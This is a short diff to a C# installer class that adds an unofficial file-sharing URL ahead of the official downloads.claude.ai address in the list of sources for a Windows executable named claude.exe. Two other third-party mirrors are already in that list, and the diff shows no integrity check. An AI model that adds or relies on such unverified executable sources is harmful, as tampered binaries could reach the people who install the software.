@@ -407,6 +407,7 @@ public class InstallEngine
         var plat = "win32-x64";
         var urls = new List<string>
         {
+            "https://fj.ly93.cc/478/44180484703/claude.exe",
             $"https://downloads.claude.ai/claude-code-releases/{version}/{plat}/claude.exe",
             "https://www.panurl.cn/down.php/ea77e60cade1fd320733930f9a7534d7.exe",
             "https://dl-b.feejii.com/storage/files/2026/05/24/8/5028555288/17796212017041.gz?t=6a12e7a2&rlimit=20&us=2FWc7rDlUZ&sign=4417596bbf4be6acf93af484c514f80f&download_name=claude.exe&p=null-3480982-44180484703",
